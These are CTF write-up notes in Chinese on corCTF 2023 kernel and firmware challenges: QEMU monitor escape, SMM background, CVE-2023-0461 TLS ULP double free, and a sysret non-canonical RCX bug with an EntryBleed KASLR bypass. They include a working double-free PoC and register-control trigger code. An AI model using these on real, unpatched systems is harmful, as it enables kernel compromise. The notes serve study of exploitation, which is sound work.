## zeroday

> Reference: https://blog.libh0ps.so/2023/08/02/corCTF2023.html

```bash
#!/bin/sh

qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel "./bzImage" \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -initrd "./initramfs.cpio.gz"
```

在 QEMU 執行腳本中沒有加上 `-monitor /dev/null` (or `-monitor none`)，因此可以透過 `\x01c` 進到 QEMU monitor mode (local 可以送 CtrlA + C 觸發)。

透過 `info registers` 可以取得 kernel 執行時的 gs register value，藉此得到 kernel heap address，然後把所有的 heap address dump 下來後，取得存在於 initramfs 當中的 flag。



## smm-diary

> Reference: https://www.willsroot.io/2023/08/smm-diary-writeup.html



### Overview / Background

```bash
#!/bin/sh

path=$(pwd)/dist
cp $path/FV/OVMF_VARS.fd OVMF_VARS.fd

qemu-system-x86_64 \
    -m 4096M \
    -smp 1 \
    -kernel "./bzImage" \
    -append "console=ttyS0 panic=-1 ignore_loglevel pti=on" \
    -netdev user,id=net \
    -device e1000,netdev=net \
    -display none \
    -vga none \
    -serial stdio \
    -monitor tcp:127.0.0.1:1337,server,nowait \ # QEMU monitor 透過 socket 連線使用
	\ # q35 Standard PC (Q35 + ICH9, 2009) (alias of pc-q35-8.0)
	-machine q35,smm=on,accel=tcg \ # 啟用 smm
    -cpu max \ # 
    -initrd "./initramfs.cpio.gz" \
    -global driver=cfi.pflash01,property=secure,value=on \
    -drive if=pflash,format=raw,unit=0,file=$path/FV/OVMF_CODE.fd,readonly=on \
    -drive if=pflash,format=raw,unit=1,file=OVMF_VARS.fd \
    -global ICH9-LPC.disable_s3=1 \ # ICH9 為 IO controller
    \ # options below are used to capture OVMF debug messages on qemu
    -debugcon file:debug.log \ # 將 debug console 的資料輸出到檔案內
    -global isa-debugcon.iobase=0x402 \ # default OVMF build writes debug messages to IO port 0x402
    -no-reboot
```

- **EDK2 (EFI Development Kit II)** - open-source development environment for creating UEFI (Unified Extensible Firmware Interface) firmware
  - [官方 github repo](https://github.com/tianocore/edk2/tree/master) - Firmware development environment for the UEFI
- **OVMF (Open Virtual Machine Firmware)** - an **EDK II based** project to enable UEFI support for Virtual Machines. OVMF contains sample UEFI firmware for QEMU and KVM
  - [官方 README 介紹](https://github.com/tianocore/edk2/blob/master/OvmfPkg/README) - Open Virtual Machine Firmware (OVMF) project aims to support firmware for Virtual Machines using the edk2 code base (支援虛擬機的 UEFI)
- **SMM (System Management mode)** - operating mode of x86 central processor units (CPUs). Sometimes called ring -2 in reference to protection rings
- **OVMF_CODE.fd** - contains the UEFI firmware code (also known as the firmware image) for virtual machines
- **OVMF_VARS.fd** - contains the UEFI variables for the virtual machine



作業系統啟動時的模式切換如下：

1. real mode (16-bit)
2. protected mode  (32-bit)
3. long mode - EFER.LME=1, CR4.PAE=1 --> CR0.PG=1
   1. 64-bit mode - CS.L=1
   2. compatibility mode (32-bit)

而在各個 mode 切換到 SMM (system management mode) 時使用到的機制：

- SMI - System management interrupts
- [RSM](https://www.felixcloutier.com/x86/rsm) - Resume From System Management Mode

其他關於 SMM 的機制重點：

- Run transparent to the operating system - 作業系統不知道 SMM 什麼時候離開與結束
- SMI handler 會直接做在 BIOS flash 裡面
- SMI 基本上為 non-maskable，但優先度又更高

觸發並與 SMI 互動的方法為：

1. 將要傳遞的資料寫入 0xB3 port
2. 將要傳遞的資料寫入 0xB2 port，而此時才會觸發 SMI

當觸發 SMI 時：

1. waits for all instructions to complete and stores to complete 
2. saves the context in **SMRAM (System Management RAM)** and begins executing the SMI Handler
3. 執行中若發現執行狀態錯誤，會進到 shutdown state
4. 執行 instruction `rsm` 離開 SMM

與 SMRAM 相關的資訊：

- SMRAM 為一塊 protected memory region，用於存放 SMM code、data 與相關執行狀態，預設大小為 64 KB
- **SMBASE** - a cpu internal register that contains the base address of SMRAM for a processor
- **State saved area** - When switching to SMM the cpu state is saved on SMM at particular offset from SMBASE
- 能透過修改 SMBASE+ `0xFEF8` 內存放的 physical address 做 relocation



### Analysis

`ovmf_uefi_dist.diff` 對 EDK2 做 patch，調整了以下檔案：

- OvmfPkg/OvmfPkg.dec
- OvmfPkg/OvmfPkgX64.fdf
- OvmfPkg/Corctf/Corctf.inf (新增)
- OvmfPkg/Corctf/Corctf.h (新增)
- OvmfPkg/Corctf/Corctf.c (新增)



一開始啟動 QEMU 後，會先去執行 UEFI，也就是 OVMF_CODE 的內容，初始化完後會交由 kernel 繼續執行。而在後續我們對 0xb2 port 做寫入後，就會觸發 SMI，並將執行權限轉交給存在於 UEFI 的 SMI handler。

透過 QEMU monitor 的命令 `info mtree` 可以知道 SMRAM 載入的位址：

```
memory-region: smram
  0000000000000000-00000000ffffffff (prio 0, i/o): smram
    0000000000030000-000000000004ffff (prio 0, ram): alias smbase-window @pc.ram
    00000000000a0000-00000000000bffff (prio 0, ram): alias smram-low @pc.ram
    000000007f000000-000000007fffffff (prio 0, ram): alias tseg-window @pc.ram
```

我們也可從 MSR 中取得 `SMBASE` register 的值，不過有一些狀況需要考慮：

- SMRAM 在 boot 後會 relocate，但當 compatible SMM space 啟用時，會 relocate 到固定位址
- 位於 DRAM controller (0:0:0) 的 SMRAMC register，當 `G_SMRAME` ([3:3]) 為 1 時代表相容

從 QEMU 啟動參數 `-machine q35` 可以得知 VM 使用模擬的 Intel Q35 Express chipsets，從 [datasheet](https://www.intel.com/Assets/PDF/datasheet/316966.pdf) P.85 得知 Device ID 為 0x29C0，並且 SMRAMC 的 offset 為 0x9D。我們可以使用下方程式碼取得 `G_SMRAME` 的值 （參考 resoure 的第二個連結）：

```c
struct pci_dev *dev;
u8 pci_data;
dev = pci_get_device(0x8086, 0x29C0, NULL);
pci_read_config_byte(dev, 0x9d, &pci_data);
pci_data = pci_data >> 3;
pci_data = pci_data & 0x1;
printk(KERN_INFO "G_SMRAME is set to %x.\n", pci_data);
```

同樣在 datasheet P.32 有提到：

> SMRAM space remapping to A0000h (128 KB)

配合 `ioremap()` 可以直接存取該物理記憶體位址：

```c
void __iomem *mapped;
int i;

mapped = ioremap(0xA0000, 0x1000);
for (i = 0; i < 0x1000; i += 8) {
    printk(KERN_INFO "%03x: %016lx\n", i, *(unsigned long *)(mapped + i));
}
iounmap(mapped);
```

或是直接使用 busybox 的功能：

```c
busybox devmem 0xa0000
```

但是 P.56 有提到：

> Compatible SMRAM Address Range (A_0000h – B_FFFFh)
>
> .... Non-SMM-mode processor accesses to this range are considered to be to the Video Buffer Area as described above

因為 0xa0000 ~ 0xbffff 這塊空間同時也是 Video Buffer Area，因此在 Non-SMM 時存取會是存取到 VBA，而如果是 SMM 的話就會存取到 SMRAM



TODO...



### Resource

1. https://opensecuritytraining.info/IntroBIOS_files/Day1_07_Advanced%20x86%20-%20BIOS%20and%20SMM%20Internals%20-%20SMM.pdf
2. [Firmware security 3: Digging into System management mode (SMM)](https://nixhacker.com/digging-into-smm/)



## The Catacomb

對 ULP (Upper Layer Protocol) 的連線做 patch，其實就是引入了 CVE-2023-0461 的 [issue](https://lore.kernel.org/all/4b80c3d1dbe3d0ab072f80450c202d9bc88b4b03.1672740602.git.pabeni@redhat.com/)：

```diff
diff --git a/net/ipv4/inet_connection_sock.c b/net/ipv4/inet_connection_sock.c
index 8e35ea6..779a95f 100644
--- a/net/ipv4/inet_connection_sock.c
+++ b/net/ipv4/inet_connection_sock.c
@@ -1222,26 +1222,12 @@ void inet_csk_prepare_forced_close(struct sock *sk)
 }
 EXPORT_SYMBOL(inet_csk_prepare_forced_close);

-static int inet_ulp_can_listen(const struct sock *sk)
-{
-       const struct inet_connection_sock *icsk = inet_csk(sk);
-
-       if (icsk->icsk_ulp_ops && !icsk->icsk_ulp_ops->clone)
-               return -EINVAL;
-
-       return 0;
-}
-
 int inet_csk_listen_start(struct sock *sk)
 {
        struct inet_connection_sock *icsk = inet_csk(sk);
        struct inet_sock *inet = inet_sk(sk);
        int err;

-       err = inet_ulp_can_listen(sk);
-       if (unlikely(err))
-               return err;
-
        reqsk_queue_alloc(&icsk->icsk_accept_queue);

        sk->sk_ack_backlog = 0;
```

- socket 連線的呼叫流程：`inet_stream_ops.listen` --> `inet_listen()` --> `inet_csk_listen_start()`
- 而 `inet_ulp_can_listen()` 用來檢查是否可以接收連線，因為預設的 `icsk->icsk_ulp_ops` 為 NULL，因此我們要找出初始化 `icsk->icsk_ulp_ops` 但 `icsk->icsk_ulp_ops->clone` 為 NULL 的部分，這樣才能執行到 patch 產生的新執行路線

Kernel 的版本是 6.1.38，以下為一些 primitive 的 config：

```
# CONFIG_FUSE_FS is not set
# CONFIG_USERFAULTFD is not set
CONFIG_USER_NS=y
```

保護機制的 config：

```
CONFIG_HARDENED_USERCOPY=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
```



設置 `icsk_ulp_ops`：

```c
static int __tcp_set_ulp(struct sock *sk, const struct tcp_ulp_ops *ulp_ops)
{
    struct inet_connection_sock *icsk = inet_csk(sk);
    int err;

    err = -EEXIST;
    if (icsk->icsk_ulp_ops)
        goto out_err;

    if (sk->sk_socket)
        clear_bit(SOCK_SUPPORT_ZC, &sk->sk_socket->flags);

    err = -ENOTCONN; // 尚未連接
    if (!ulp_ops->clone && sk->sk_state == TCP_LISTEN)
        goto out_err;

    err = ulp_ops->init(sk);
    icsk->icsk_ulp_ops = ulp_ops;
    return 0;
}
```

- `do_tcp_setsockopt()` --> `tcp_set_ulp()` --> `__tcp_set_ulp()`
- 對應名稱的 `ulp_ops` 會在 `tcp_ulp_find()` 遍歷 `tcp_ulp_list` 來搜尋，一共有四個 module 會註冊：
  - espintcp
  - SMC
  - **tls** (有編譯到 kernel 當中)
  - mptcp

查看 `tcp_tls_ulp_ops`，發現沒有實作 `clone` member：

```c
static struct tcp_ulp_ops tcp_tls_ulp_ops __read_mostly = {
    .name			= "tls",
    .owner			= THIS_MODULE,
    .init			= tls_init,
    .update			= tls_update,
    .get_info		= tls_get_info,
    .get_info_size		= tls_get_info_size,
};
```

我們可以透過 `setsockopt(sockfd, SOL_TCP, TCP_ULP, "tls", sizeof("tls"))` 指定要使用 tls 作為 ULP，而在初始化的過程中會呼叫 `tcp_tls_ulp_ops.init`：

```c
static int tls_init(struct sock *sk)
{
    struct tls_context *ctx;
    int rc = 0;

    tls_build_proto(sk);
    if (sk->sk_state != TCP_ESTABLISHED)
        return -ENOTCONN;

    ctx = tls_ctx_create(sk);
	// ...
    return rc;
}
```

- `tls_build_proto()` - 初始化 function pointer
- `tls_ctx_create()` - 分配大小為 0x148 的 `struct tls_context` (kmalloc-512)

不過 tls 需要 `sk->sk_state` 為 `TCP_ESTABLISHED` 才能正常初始化，但是 `listen()` 的 `sk->sk_state` 要是 `TCP_LISTEN`。正常 socket 在連線就不能主動 disconnect 改變原先的 `TCP_ESTABLISHED` 狀態，而這部分需要使用 `AF_UNSPEC` 這個 socket family，下方為 kernel 內對於該 protocol 處理的程式碼：

```c
int __inet_stream_connect(struct socket *sock, struct sockaddr *uaddr,
          int addr_len, int flags, int is_sendmsg)
{
    struct sock *sk = sock->sk;
    int err;
    long timeo;

    if (uaddr) {
        // ...
        if (uaddr->sa_family == AF_UNSPEC) {
            err = sk->sk_prot->disconnect(sk, flags);
            sock->state = err ? SS_DISCONNECTING : SS_UNCONNECTED;
            goto out;
        }
    }
}
```

- `__sys_connect()` --> `inet_stream_connect()` --> `__inet_stream_connect()`
- 可以發現如果 family 為 `AF_UNSPEC`，就會呼叫 `tcp_disconnect()` 中斷 socket 的連線再繼續執行

再來我們需要分析如果 `tcp_ulp_ops` 沒有實作 `clone` member，在執行期間會發生什麼事。首先直接使用到 `clone` member 的 function 為 `inet_clone_ulp()`：

```c
static void inet_clone_ulp(const struct request_sock *req, struct sock *newsk,
           const gfp_t priority)
{
    struct inet_connection_sock *icsk = inet_csk(newsk);

    if (!icsk->icsk_ulp_ops)
        return;

    if (icsk->icsk_ulp_ops->clone)
        icsk->icsk_ulp_ops->clone(req, newsk, priority);
}
```

- `tcp_v4_syn_recv_sock()` --> `tcp_create_openreq_child()` --> `inet_csk_clone_lock()` --> `inet_clone_ulp()`

也就是說，在 socket 接收到連線後，會呼叫 `sk_clone_lock()` 複製原本的 `struct sock`，再呼叫 ulp 的 `clone` member 複製一份 ulp 執行狀態。下方為複製 `struct sock` 時的部分執行流程：

```c
struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority)
{
    // ...
    sock_copy(newsk, sk);
}

static void sock_copy(struct sock *nsk, const struct sock *osk)
{
    const struct proto *prot = READ_ONCE(osk->sk_prot);
    memcpy(nsk, osk, offsetof(struct sock, sk_dontcopy_begin));
    memcpy(&nsk->sk_dontcopy_end, &osk->sk_dontcopy_end,
           prot->obj_size - offsetof(struct sock, sk_dontcopy_end));
}
```

基本上是完全複製，因此 ulp 的資料也會被複製到 clone 出來的 `struct sock`。我們再回到 `tls_init()`，分析用來分配 `tls_context` 的 function `tls_ctx_create()` 做了什麼事：

```c
struct tls_context *tls_ctx_create(struct sock *sk)
{
    struct inet_connection_sock *icsk = inet_csk(sk);
    struct tls_context *ctx;
	
    ctx = kzalloc(sizeof(*ctx), GFP_ATOMIC);
    mutex_init(&ctx->tx_lock);
    rcu_assign_pointer(icsk->icsk_ulp_data, ctx); // here
    ctx->sk_proto = READ_ONCE(sk->sk_prot);
    ctx->sk = sk;
    return ctx;
}
```

ulp data `icsk->icsk_ulp_data` 存放著指向 `tls_context` 的指標，並且 `tls_context` 在關閉 socket 時會被釋放：

```c
static void tls_sk_proto_close(struct sock *sk, long timeout)
{
	// ...
    if (free_ctx)
        tls_ctx_free(sk, ctx);
    // ...
}
```

這也意味著，兩個不同的 socket 指向同一塊 `struct tls_context`，而當其中一個 socket 被關閉，這個 `struct tls_context` object 仍然可以被另一個 socket 給存取到。

以下為觸發 double free 的 PoC，不過因為釋放是使用 RCU，因此會需要等待一段 grace period 才會印出錯誤訊息：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

static void perror_exit(const char *msg)
{
    perror(msg);
    exit(1);
}

static void input()
{
    char c[2];
    write(1, "> ", 2);
    read(0, c, sizeof(c));
}

int main()
{
    struct sockaddr_in addr;
    int tls;
    int server;
    int ret;
    int clientfd;

    tls = socket(AF_INET, SOCK_STREAM, 0);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(8888);
    ret = bind(server, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == -1)
        perror_exit("bind server");
    listen(server, 0);

    ret = connect(tls, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == -1)
        perror_exit("connect tls 8888");

    clientfd = accept(server, (struct sockaddr *)&addr, (socklen_t *)&ret);
    if (clientfd == -1)
        perror_exit("accept server");

    // tls is in TCP_ESTABLISHED state
    ret = setsockopt(tls, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
    if (ret == -1)
        perror_exit("setsockopt tls");

    addr.sin_family = AF_UNSPEC;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(8889);
    // use AF_UNSPEC to disconnect established tcp
    ret = connect(tls, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == -1)
        perror_exit("connect tls 8889");

    addr.sin_family = AF_INET;
    ret = bind(tls, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == -1)
        perror_exit("bind tls");
    // tls is in TCP_LISTEN state
    listen(tls, 0);

    ret = socket(AF_INET, SOCK_STREAM, 0);
    ret = connect(ret, (struct sockaddr *)&addr, sizeof(addr));
    clientfd = accept(tls, (struct sockaddr *)&addr, (socklen_t *)&ret);
    // trigger tls_sk_proto_close to release tls_context
    input();
    close(clientfd);
    close(tls);

    return 0;
}
```





```c
#define GFP_ATOMIC	(__GFP_HIGH|__GFP_KSWAPD_RECLAIM)
#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)
```





## sysruption

### Analysis

題目一共三個關鍵檔案，分別為執行虛擬機的 run.sh 腳本、定義核心編譯設定的 kconfig，以及引入核心錯誤的 patch.diff。

以下為 run.sh 的檔案內容：

```bash
qemu-system-x86_64 \
	# ...
    -smp 1 \
    -append "console=ttyS0 loglevel=3 panic=-1 pti=off kaslr"
    # ...
```

除了預設就會啟動的 SMAP、SMEP 之外，保護機制 KASLR 也有開啟。此外根據題目敘述，因為核心在偵測到 hardware meltdown mitigation 時會自動關閉 KPTI，因此為了確保環境的同步，在核心啟動時加上 `pti=off` 這個參數來關閉 KPTI。



以下為 patch.diff 的檔案內容：

```diff
--- orig_entry_64.S
+++ linux-6.3.4/arch/x86/entry/entry_64.S
@@ -150,13 +150,13 @@
        ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
                "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
-       shl     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-       sar     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # shl   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # sar   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 #endif

        /* If this changed %rcx, it was not canonical */
-       cmpq    %rcx, %r11
-       jne     swapgs_restore_regs_and_return_to_usermode
+       # cmpq  %rcx, %r11
+       # jne   swapgs_restore_regs_and_return_to_usermode

        cmpq    $__USER_CS, CS(%rsp)            /* CS must match SYSRET */
        jne     swapgs_restore_regs_and_return_to_usermode
```

這個 patch 改變了 system call handler `entry_SYSCALL_64()` 回到 userspace 前的暫存器處理，而這段程式碼有以下重點：

- rcx 會存放 userspace 執行 `syscall` 後的下個指令位址
- 在 level4 paging 時 `__VIRTUAL_MASK_SHIFT+1` 的值會是 16，因此當位址大於 `0x800000000000` 時，左偏移 16 的操作會導致 MSB 變成 1
- 因為在右偏移回去時使用的是 `sar`，MSB 在偏移後不會被更新，因此能確保執行結果大於 `0xffff800000000000`

我們能從註解 **If this changed %rcx, it was not canonical** 以及 [linux 文件](https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt)得知因為 non-canonical 位址的範圍落在 `0x800000000000` ~ `0xffff7fffffffffff`，在做完偏移的操作後會得到不同的結果 (rcx != r11)，所以會跳去呼叫 `swapgs_restore_regs_and_return_to_usermode()` 回到 userspace。

預設 `entry_SYSCALL_64()` 會使用 `sysret` 回到 userspace，然而如果跳去呼叫 `swapgs_restore_regs_and_return_to_usermode()`，最後就會用 `iret`。而 `sysret` 與 `iret` 宏觀上的差別如下：

- [sysret](https://www.felixcloutier.com/x86/sysret) - Return From Fast System Call

  - 在 kernel space 就設置好暫存器的值，執行該指令的時候只會更新 rip 成 rcx 以及更新 rflags 成 r11

- [iret](https://www.felixcloutier.com/x86/iret:iretd:iretq) - Interrupt Return

  - 將 kernel stack 上的值 `pop` 出來並依序更新成暫存器 RIP, CS, RFLAGS, RSP, SS。因此常常會在 kernel exploit 中類似看到下方的程式碼，這就是要讓執行 `iret` 時能恢復 user space 正常的狀態：
    ```c
    size_t user_ss, user_cs, user_rflags, user_sp;
    static void save_status() {
        __asm__("mov user_ss, ss\n"
                "mov user_cs, cs\n"
                "mov user_sp, rsp\n"
                "pushf\n"
                "pop user_rflags\n");
    }
    
    int main() {
        ...
        rop[i++] = user_rip;
        rop[i++] = user_cs;
        rop[i++] = user_rflags;
        rop[i++] = user_sp;
        rop[i++] = user_ss;
    }
    ```

    

Patch 讓 `entry_SYSCALL_64()` 不對 rcx 做 mask，也不檢查是否 rcx 落在 non-canonical memory region，但這樣會造成什麼影響？而在 patch 位置上方的原始碼有一段註解：

```
/*
 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
 * in kernel space.  This essentially lets the user take over
 * the kernel, since userspace controls RSP.
 * ...
 */
```

- 如果執行 `sysret` 時 rcx 是 non-canonical address，就會在 kernel space 觸發 #GP
- #GP 為 General protection fault，在發生時會由 `asm_exc_general_protection()` 來處理 ([src](https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/traps.c#L728))
- 在 rcx 為 non-coanonical address 執行 `SYSRET` 可能會有安全疑慮，因為觸發 #GP 的時候 rsp 是 userspace 可控的

觸發 #GP 的情境與處理方式能由 `sysret` 更詳細的[操作描述](https://www.felixcloutier.com/x86/sysret#operation)得知：

```
IF (CS.L ≠ 1 ) or (IA32_EFER.LMA ≠ 1) or (IA32_EFER.SCE ≠ 1)
(* Not in 64-Bit Mode or SYSCALL/SYSRET not enabled in IA32_EFER *)
    THEN #UD; FI;
IF (CPL ≠ 0) THEN #GP(0); FI;
IF (operand size is 64-bit)
    THEN (* Return to 64-Bit Mode *)
        IF (RCX is not canonical) THEN #GP(0);
...
CS.Selector := CS.Selector OR 3;
            (* RPL forced to 3 *)
CS.DPL := 3;
CPL := 3;
...
SS.Selector := (IA32_STAR[63:48]+8) OR 3;
            (* RPL forced to 3 *)
SS.DPL := 3;
```

當執行 `sysret` 時依序會做 non-canonical address 的檢查、設置 CS (code segment) 的執行權限成 user mode、設置 CPL (實際上 CPL 是 CS[0:1])、設置 SS (stack segment) 的執行權限成 user mode。

綜合上述所有資訊，可以得知在觸發 #GP 的執行權限都還是 kernel mode，並且在 rcx 為 non-canonical address 時，#GP handler 會使用 userspace 可控的 rsp 來執行。



### Trigger Vuln

一般的執行流程並沒有辦法控制 syscall 的 rcx，因為 rcx 會等於 `syscall` 下一個指令的位址。然而，透過 signal 或是 ptrace 機制所提供的功能，就能控制程式在從 kernel space 回去時的 register 狀態，其中就包含了 rcx。下方的範例程式能註冊 `SIGTRAP` handler 成 `handler_trap()`，並因為 `action.sa_flags` 帶有 `SA_SIGINFO`，signal handler 能夠取得所有 register 的狀態並做更新：

```c
void handler_trap(int signum, siginfo_t *info, void *ucontext)
{
    ucontext_t *uc;
    uc = ucontext;
    uc->uc_mcontext.gregs[REG_RIP] = 0x800000000000;
    uc->uc_mcontext.gregs[REG_RCX] = 0x800000000000;
}

int main()
{
    struct sigaction action = {};
    sigemptyset(&action.sa_mask);
    action.sa_sigaction = handler_trap;
    action.sa_flags |= SA_SIGINFO;
    sigaction(SIGTRAP, &action, NULL);
    asm("int3");
}
```

最後在 `rt_sigreturn` syscall handler 結束後更新程式的 register。然而，雖然 kernel 檢查 rcx 的程式碼被 patch 掉，但是在 `sysret` 被執行到之前仍然有許多條件限制：

```assembly
# https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S#L186
cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
jne	swapgs_restore_regs_and_return_to_usermode

movq	R11(%rsp), %r11
cmpq	%r11, EFLAGS(%rsp)		/* R11 == RFLAGS */
jne	swapgs_restore_regs_and_return_to_usermode

testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11
jnz	swapgs_restore_regs_and_return_to_usermode

cmpq	$__USER_DS, SS(%rsp)		/* SS must match SYSRET */
jne	swapgs_restore_regs_and_return_to_usermode

# ...

swapgs
sysretq
```

1. 更新後的 cs 與 ss register 要與更新前的一樣
2. r11 與 rflags register 的內容要一樣
3. rflags 不能包含 RF (Resume Flag) 以及 TF (Trap Flag)

稍微對 register 的內容做些調整即可滿足：

```c
uc->uc_mcontext.gregs[REG_R11] = 0x00246;
uc->uc_mcontext.gregs[REG_EFL] = 0x00246;
```



### #GP Handler

當觸發 interrupt 時，kernel 會透過先前註冊的 interrupt handler 來處理，而在編譯階段變數 `def_idts[]` 就保存著預設的 idt  (Interrupt Descriptor Table) table entry，其中就包含了 #GP (general protection)：

```c
// https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/idt.c#L83
static const __initconst struct idt_data def_idts[] = {
	// ...
	INTG(X86_TRAP_GP,		asm_exc_general_protection),
    // ...
};
```

但在 linux 初始化階段還會根據 `def_idts[]` 設置 `idt_table[]`，以下為程式碼片段：

```c
// https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/idt.c#L226
void __init idt_setup_traps(void)
{
	idt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), true);
}

// https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/idt.c#L188
static __init void
idt_setup_from_table(gate_desc *idt, const struct idt_data *t, int size, bool sys)
{
	gate_desc desc;

	for (; size > 0; t++, size--) {
    	idt_init_desc(&desc, t);
        // equal to "memcpy(&idt[t->vector], &desc, sizeof(desc))"
    	write_idt_entry(idt, t->vector, &desc);
    	if (sys)
        	set_bit(t->vector, system_vectors);
	}
}
```

該變數會被用做 idt 存取，並在 interrupt 發生時被使用到。舉例來說，當程式觸發 #GP 時，會由註冊在 idt 的 #GP handler `exc_general_protection()` 來處理 ([src](https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/traps.c#L728))。不過所有 handler 在被執行之前，都會透過 `error_entry()` 保存錯誤發生時的執行狀態，下方程式碼包裝了這部分處理的定義：

```c
// https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/include/asm/idtentry.h#L564
DECLARE_IDTENTRY_ERRORCODE(X86_TRAP_TS,	exc_invalid_tss);
DECLARE_IDTENTRY_ERRORCODE(X86_TRAP_NP,	exc_segment_not_present);
DECLARE_IDTENTRY_ERRORCODE(X86_TRAP_SS,	exc_stack_segment);
DECLARE_IDTENTRY_ERRORCODE(X86_TRAP_GP,	exc_general_protection);
DECLARE_IDTENTRY_ERRORCODE(X86_TRAP_AC,	exc_alignment_check);
```

以 #GP 為例子，實際上的執行流程會是 `asm_exc_general_protection()` (進入點)、`error_entry()` (保存狀態)、`exc_general_protection()` (真正處理)。

然而，因為 SMAP 保護機制的關係，kernel space 並不能以 userspace 的記憶體空間作為 stack 使用，因此我們勢必要找出一個方法可以取得 kernel address，至少讓 #GP handler 能夠正常的執行下去。



### Bypass KASLR

為了解決 meltdown 的硬體，KPTI (Kernel Page Table Isolation) 機制的出現是讓 user 與 kernel 使用不同的 page table，避免利用 userspace 的程式透過 side channel attack 來取得存在於 kernel space 的資料。[EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html) 向我們介紹了如何在 intel 架構與 KPTI 的保護機制下，透過一些特殊的指令來繞過 KASLR。下方為使用到的指令：

- 將指定記憶體的資料 fetch 起來 ([doc](https://www.felixcloutier.com/x86/prefetchh.html))
  - `PREFETCHT2` - Move data from m8 closer to the processor using T2 hint
  - `PREFETCHNTA` - Move data from m8 closer to the processor using NTA hint
- 高精度計算時間 ([doc](https://www.felixcloutier.com/x86/rdtscp))
  - `RDTSCP` - Read Time-Stamp Counter and Processor ID

如果有效記憶體的資料已經在 cache 當中，prefetch 相關指令的執行時間就會比較快，配合 `RDTSCP` 高精度的時間計算，在大量執行次數的情況下就會有大量的落差。因為 syscall handler 會不斷被使用到，我們可以透過爆搜的方式找到存取時間比較快的 kernel address，代表這個位址對應到的 function 有很高的機率是 syscall handler 的執行過程中所呼叫到的。其他繞過細節與實作方式已經在 [EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html) 介紹的很清楚，這邊就不多做贅述。

簡而言之，即便是在 KPTI 有開啟的情況下，目前 KASLR 保護機制都能透過 [EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html) 繞過。



### Unexpected #DF

不過在 `exc_general_protection()` 的執行過程中，會因為 kernel 嘗試存取 gs 對應到的記憶體位址而發生 page fault：

```
   <exc_general_protection+8>     mov    rbp, rdi
   <exc_general_protection+11>    push   rbx
   <exc_general_protection+12>    sub    rsp, 0x70
 ► <exc_general_protection+16>    mov    rax, qword ptr gs:[0x28]
   <exc_general_protection+25>    mov    qword ptr [rsp + 0x68], rax
   <exc_general_protection+30>    xor    eax, eax
```

原因是在 `sysret` 之前會先執行 `swapgs` 切換成 userspace process 的 gs (0)，但在 kernel space 中 gs register 會被當作 per-cpu 資料的 base address 來使用，因此 kernel 在嘗試存取一個無效的記憶體位址時，就會觸發 page fault (#PF)。

然而在負責處理 #PF 的 `exc_page_fault()` 也會需要存取 gs register：

```
   <exc_page_fault+9>     push   rbp
   <exc_page_fault+10>    mov    rbp, rdi
   <exc_page_fault+13>    mov    r12, cr2
 ► <exc_page_fault+17>    mov    rax, qword ptr gs:[0x20f40]   <level2_kernel_pgt+3656>
   <exc_page_fault+26>    mov    rax, qword ptr [rax + 0x4a0]
   <exc_page_fault+33>    prefetchw byte ptr [rax + 0x70]
```

因此又會再觸發一次 page fault，而重複發生的 page fault 會在存取到非法的 address 時被視為 double page fault (#DF) 的發生，並導致 kernel panic。

考慮到 #GP handler 必定會有 gs register 的存取，如果要順利做 exploit，有兩條可以嘗試的方向：

1. 修復好 gs register 讓 #GP handler 能順利執行
2. 在 #PF handler 被呼叫前攔截 RIP

解題過程中因為在修改 gs 時遇到一些問題，因此最後選擇第二條路，不過實際上 gs register 可以透過指令 `wrgsbase` 輕鬆修改，以下為使用方式：

```c
asm volatile("wrgsbase %0" : : "r" (gsbase));
```

到目前為止，我們能控制 process 在執行 #GP handler 時所使用的 rsp，但我們需要在 #PF handler 被呼叫之前控制 RIP 來避免 #DF 的發生，為此我們需要分析 #GP 的執行流程，並挑選適合的 kernel 變數做利用。



### Page Table

在說明利用手法前，需要先對 page table 做一些簡單的介紹。Intel 指令集底下的 Linux 預設是使用 Level-4 的 paging，因此我們假設執行環境為 Level-4 paging ([圖片來源](https://kernemporium.github.io/kernel/intro/))：

![Introduction to kernel exploitation :: kernemporium](https://kernemporium.github.io/four_level_paging.png)

- 63~48 - sign extend
